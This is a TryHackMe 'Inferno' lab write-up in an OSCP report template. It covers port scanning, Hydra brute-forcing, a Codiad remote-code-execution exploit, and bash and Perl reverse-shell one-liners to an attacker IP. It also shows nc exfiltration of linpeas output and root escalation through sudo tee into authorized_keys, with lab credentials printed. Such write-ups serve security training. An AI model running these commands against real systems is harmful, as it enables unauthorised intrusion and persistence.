---
title: "Report: TryHackMe: Inferno"
author: ["jurgen.kobierczynski@telenet.be", ""]
date: "2021-02-07"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "tryhackme: Inferno"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Pentesting Report: Inferno

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the  exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report and include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# Sample Report: High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems: the **THINC.local** domain.
John's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, John had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Exam Trophy 1: Got in through X
- Exam Trophy 2: Got in through X

## Sample Report: Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Sample Report: Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Sample Report: Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, John was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

Host: variable

## Sample Report: Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

# Nmap scan host

A Nmap scan of the Inferno host showed a massive amount of ports that are open:

```
# Nmap 7.91 scan initiated Mon Feb 15 11:28:42 2021 as: nmap -sC -sV -p- -oA nmap/inferno-fulltcp 10.10.88.79
Nmap scan report for 10.10.88.79 
Host is up (0.035s latency).
Not shown: 65445 closed ports                                                          
PORT      STATE SERVICE           VERSION                                              
21/tcp    open  ftp?                                                                   
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:               
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open  telnet?              
25/tcp    open  smtp?       
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec? 
106/tcp   open  pop3pw?        
110/tcp   open  pop3?                                                                  
194/tcp   open  irc?         
|_irc-info: Unable to open connection                                                                                                                                          
389/tcp   open  ldap?                                                                                                                                                          
443/tcp   open  https?         
464/tcp   open  kpasswd5?                                                              
636/tcp   open  ldapssl?
750/tcp   open  kerberos?
775/tcp   open  entomb?
777/tcp   open  multiling-http?
779/tcp   open  unknown
783/tcp   open  spamassassin?
808/tcp   open  ccproxy-http?
873/tcp   open  rsync?
1001/tcp  open  webpush?
1178/tcp  open  skkserv?
1210/tcp  open  eoss?
1236/tcp  open  bvcontrol?
1300/tcp  open  h323hostcallsc?
1313/tcp  open  bmc_patroldb?
1314/tcp  open  pdps?
1529/tcp  open  support?
2000/tcp  open  cisco-sccp?
2003/tcp  open  finger?
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open  ccproxy-ftp?
2150/tcp  open  dynamic3d?
2600/tcp  open  zebrasrv?
2601/tcp  open  zebra?
2602/tcp  open  ripd?
2603/tcp  open  ripngd?
2604/tcp  open  ospfd?
2605/tcp  open  bgpd?
2606/tcp  open  netmon?
2607/tcp  open  connection?
2608/tcp  open  wag-service?
2988/tcp  open  hippad?
2989/tcp  open  zarkov?
4224/tcp  open  xtell?
4557/tcp  open  fax?
4559/tcp  open  hylafax?
4600/tcp  open  piranha1?
4949/tcp  open  munin?
5051/tcp  open  ida-agent?
5052/tcp  open  ita-manager?
5151/tcp  open  esri_sde?
5354/tcp  open  mdnsresponder?
5355/tcp  open  llmnr?
5432/tcp  open  postgresql?
5555/tcp  open  freeciv?
5666/tcp  open  nrpe?
5667/tcp  open  unknown
5674/tcp  open  hyperscsi-port?
5675/tcp  open  v5ua?
5680/tcp  open  canna?
6346/tcp  open  gnutella?
6514/tcp  open  syslog-tls?
6566/tcp  open  sane-port?
6667/tcp  open  irc?
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?
8081/tcp  open  blackice-icecap?
8088/tcp  open  radan-http?
8990/tcp  open  http-wmap?
9098/tcp  open  unknown
9359/tcp  open  unknown
9418/tcp  open  git?
9673/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt?
10081/tcp open  famdc?
10082/tcp open  amandaidx?
10083/tcp open  amidxtape?
11201/tcp open  smsqp?
15345/tcp open  xpilot?
17001/tcp open  unknown
17002/tcp open  unknown
17003/tcp open  unknown
17004/tcp open  unknown
20011/tcp open  unknown
20012/tcp open  ss-idi-disc?
24554/tcp open  binkp?
27374/tcp open  subseven?
30865/tcp open  unknown
57000/tcp open  unknown
60177/tcp open  unknown
60179/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 15 12:05:03 2021 -- 1 IP address (1 host up) scanned in 2180.48 seconds
```

Connecting on each of these ports however show nothing usefull :

*[Image: ImgPlaceholder]*

We can however visit the webpage of the host:

*[Image: ImgPlaceholder]*

It contains the following text:

```
Oh quanto parve a me gran maraviglia
quand'io vidi tre facce a la sua testa!
L'una dinanzi, e quella era vermiglia;

l'altr'eran due, che s'aggiugnieno a questa
sovresso 'l mezzo di ciascuna spalla, 
e se' giugnieno al loco de la cresta 
```

Looking for webdirectories, we find the /inferno directory:

```
$ gobuster dir -u http://10.10.139.209 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster/inferno-large-words-x.txt -x php,txt,html
...
$ cat gobuster/inferno-large-words-x.txt | grep -v 403
/index.html (Status: 200)
/. (Status: 200)
/inferno (Status: 401)

```

We browse to the directory and we are presented with a login:

*[Image: ImgPlaceholder]*

With Hydra we can bruteforce a login (username:admin, password:dante1) on this page:

```
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f 10.10.139.209 http-get /inferno
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-15 13:12:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100000 login tries (l:1/p:100000), ~6250 tries per task
[DATA] attacking http-get://10.10.139.209:80/inferno
 
[STATUS] 4713.00 tries/min, 4713 tries in 00:01h, 95287 to do in 00:21h, 16 active
[80][http-get] host: 10.10.139.209   login: admin   password: dante1
[STATUS] attack finished for 10.10.139.209 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-15 13:15:08
```

Once logged in we are greeted with a Codiac webshell:

*[Image: ImgPlaceholder]*

The searchsploit tool doesn't return an exploit:

```
$ searchsploit codiac         
Exploits: No Results
Shellcodes: No Results
```

The first result of a search for a codiac exploit returns a RCE exploit:

```
https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit
```

The execution of the exploit is a bit not straight forward, it required issuing 2 commands to capture the reverse shell, but works without problem:

```
$ python exploit.py http://admin:dante1@10.10.139.209/inferno/ admin dante1 10.9.1.3 5353 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.9.1.3/5354 0>&1 2>&1"' | nc -lnvp 5353
nc -lnvp 5354
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!
```

The first reverse netcat creates another connection to port 5454 ( our submitted port+1 )

```
$ echo 'bash -c "bash -i >/dev/tcp/10.9.1.3/5354 0>&1 2>&1"' | nc -lnvp 5353
listening on [any] 5353 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 41042
```

On port 5354 the reverse shell is returned:

```
$ nc -lnvp 5354
listening on [any] 5354 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 38930
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ 
```

There is a caveat: the shell closes after a short time, some process is killing the connection within a minute.
We can bypass this restriction by opening a new reverse shell:

```
$ nc -lnvp 5354
listening on [any] 5354 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 38930
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$ perl -e 'use Socket;$i="10.9.1.3";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Inside the Inferno host we can take a look at the /home directory:

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 38930
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
$ cd /home
$ ls
drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 dante
$ cd dante
$ ls -al
total 72
drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .
drwxr-xr-x  3 root  root  4096 Jan 11 15:19 ..
-rw-------  1 dante dante  106 Jan 11 15:27 .Xauthority
lrwxrwxrwx  1 root  root     9 Jan 11 15:22 .bash_history -> /dev/null
-rw-r--r--  1 dante dante  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 dante dante 3771 Apr  4  2018 .bashrc
drwx------  2 dante dante 4096 Jan 11 15:25 .cache
drwxr-x---  3 dante dante 4096 Jan 11 15:46 .config
drwx------  4 dante dante 4096 Jan 11 15:46 .gnupg
-rw-r--r--  1 dante dante  807 Apr  4  2018 .profile
-rw-r--r--  1 dante dante    0 Jan 11 15:30 .sudo_as_admin_successful
drwxr-xr-x  2 root  root  4096 Jan 11 15:29 Desktop
drwxr-xr-x  2 root  root  4096 Jan 11 15:29 Documents
`drwxr-xr-x  2 root  root  4096 Jan 11 15:29 Downloads
drwxr-xr-x  2 root  root  4096 Jan 11 15:22 Music
drwxr-xr-x  2 root  root  4096 Jan 11 15:22 Pictures
drwxr-xr-x  2 root  root  4096 Jan 11 15:22 Public
drwxr-xr-x  2 root  root  4096 Jan 11 15:22 Templates
drwxr-xr-x  2 root  root  4096 Jan 11 15:22 Videos
-rw-------  1 dante dante   33 Jan 11 15:22 local.txt
$ find . -print 
.
./.bash_logout
./.profile
./Downloads
./Downloads/CantoXVII.docx
./Downloads/CantoIX.docx
./Downloads/CantoXII.docx
./Downloads/CantoI.docx
./Downloads/CantoXIV.docx
./Downloads/CantoXX.docx
./Downloads/CantoXIII.docx
./Downloads/CantoVII.docx
./Downloads/CantoXVI.docx
./Downloads/CantoII.docx
./Downloads/CantoVI.docx
./Downloads/CantoXVIII.docx
./Downloads/CantoIV.docx
./Downloads/CantoV.docx
./Downloads/CantoX.docx
./Downloads/CantoIII.docx
./Downloads/CantoXIX.docx
./Downloads/CantoXI.docx
./Downloads/.download.dat
./Downloads/CantoXV.docx
./.gnupg
find: './.gnupg': Permission denied
./Videos
./Public
./.bash_history
./Desktop
./Desktop/inferno.txt
./Desktop/purgatorio.txt
./Desktop/paradiso.txt
./.sudo_as_admin_successful
./.Xauthority
./Pictures
./Pictures/3.jpg
./Pictures/6.jpg
./Pictures/4.jpg
./Pictures/2.jpg
./Pictures/1.jpg
./Pictures/5.jpg
./local.txt
./Templates
./Documents
./Documents/caronte.doc
./Documents/virgilio.doc
./Documents/centauro.doc
./Documents/cerbero.doc
./Documents/beatrice.doc
./Music
./.config
```

The file local.txt contains the first flag:

ImgPlaceholder

In the Downloads directory there is a hidden .download.docx file.
This is the content of the file:

```
$ cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a$ 
```

With Cyberchef we decrypt the code to:

ImgPlaceholder

```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

We found a credential: dante with the password: V1rg1l10h3lpm3

This credential can be used to login using ssh, but here we have also a termination of the connection within a minute.
We use the same reverse shell method to circumvent this restriction.

```
$ perl -e 'use Socket;$i="10.9.1.3";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
$ nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 38930
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
$
```

We setup on our host a small webserver hosting a linpeas.sh script:

```
$ mkdir upload
$ cd upload
$ cp /home/user/Downloads/linpeas/linpeas.sh .
$ python3 -m http.server 8000
```

We download the linpeas script, give it execution rights, and execute it:

```
$ cd /dev/shm
$ wget http://10.9.1.3:8000/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh | tee linpeas.out
```

We transfer the linpeas.out file to our host:

```
$ nc -w 3 10.9.1.3 7777 < linpeas.out
```

```
$ nc -lnvp 7777 > linpeas-dante.out                                                                                                                                      1 ⨯
listening on [any] 7777 ...
connect to [10.9.1.3] from (UNKNOWN) [10.10.139.209] 45186
```

In the linpeas report we find a privilege escalation with sudo /usr/bin/tee:

*[Image: ImgPlaceholder]*

We use it in a direct ssh connection to add a public key we generated to /root/.ssh/authorized_keys:

```
$ ssh-keygen -f danteroot                                                                                                                                                1 ⨯
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in danteroot
Your public key has been saved in danteroot.pub
The key fingerprint is:
SHA256:fPQSoJ3vDvYFJjZ0ZaA4LzI21tbLiEEWTigWstn5HYw user@kali
The key's randomart image is:
+---[RSA 3072]----+
|....o   . ..o    |
|o=.+ + + + o     |
|+.o E * = +      |
|   + o B + o     |
|    O = S * .    |
|   o B = B o     |
|    . . = . .    |
|       . + .     |
|          o      |
+----[SHA256]-----+
$ cat danteroot.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgof+bSvt3gTqACVzFH3tGcDdoblPPNDHeiO13C3JGhEWPaxVpcwL5eGbf4tLnNMWbrC/rAJBin76Pk5j+INBT+ykWaJ0BRalck+V1+n/rjXMox+DwNyv+lwVqZlUauA+MJ216zpQVMAfj0Wt/MyK2k+GoXJ9tqZ+7fVqEwvmW73H3eQ5hLSfTDIGsc0mz+oi27NKVS1nHr2JrTQaMzOrkIL5/OARU+FtgDGn2JLcXql1ceLMH7I+E+hsGb9wQPoxPxpTKj6vRouS/Nnd1fwz6zafbJYpNlwk+Bh0NqNpW2bCI2tQ9AmvYSVbOQLSeTXlPlz3mEx3mXkkeIA6qv6N43TCvH6FJwgZHirKV9H50v6to9uMx7RXwKYObZskON1nUC0btHvcJD7GK5zDD7E822FqCCpymdMZOk9Pn6zGqDBYS4mH3ZtMla5vOTkkGiU+JggaQ+72aQ8BRh0Ciab7XLRUNbrXyO5Qk5RtzyrLxUXwDUIj981CSsIH1CLHJJIs= user@kali
```

```
$ ssh dante@10.10.139.209
The authenticity of host '10.10.139.209 (10.10.139.209)' can't be established.
ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.143.205' (ECDSA) to the list of known hosts.
dante@10.10.139.209's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 15 16:17:13 UTC 2021

  System load:  0.02              Processes:           1199
  Usage of /:   41.8% of 8.79GB   Users logged in:     0
  Memory usage: 76%               IP address for eth0: 10.10.139.209
  Swap usage:   0%

39 packages can be updated.
0 updates are security updates.

Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$
LFILE=/root/.ssh/authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgof+bSvt3gTqACVzFH3tGcDdoblPPNDHeiO13C3JGhEWPaxVpcwL5eGbf4tLnNMWbrC/rAJBin76Pk5j+INBT+ykWaJ0BRalck+V1+n/rjXMox+DwNyv+lwVqZlUauA+MJ216zpQVMAfj0Wt/MyK2k+GoXJ9tqZ+7fVqEwvmW73H3eQ5hLSfTDIGsc0mz+oi27NKVS1nHr2JrTQaMzOrkIL5/OARU+FtgDGn2JLcXql1ceLMH7I+E+hsGb9wQPoxPxpTKj6vRouS/Nnd1fwz6zafbJYpNlwk+Bh0NqNpW2bCI2tQ9AmvYSVbOQLSeTXlPlz3mEx3mXkkeIA6qv6N43TCvH6FJwgZHirKV9H50v6to9uMx7RXwKYObZskON1nUC0btHvcJD7GK5zDD7E822FqCCpymdMZOk9Pn6zGqDBYS4mH3ZtMla5vOTkkGiU+JggaQ+72aQ8BRh0Ciab7XLRUNbrXyO5Qk5RtzyrLxUXwDUIj981CSsIH1CLHJJIs= user@kali' | sudo /usr/bin/tee -a "$LFILE"
```

Then we can login using the private key.

The same auto disconnect feature is on the root account and can be circumvented using a reverse shell.

Now we can execute this backup suid root file to escalate to root and read the root flag:

*[Image: ImgPlaceholder]*

**Vulnerability Fix:**

## Sample Report: Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## Sample Report: House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, John removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items Not Mentioned in the Report

This section is placed for any additional items that were not mentioned in the overall report.
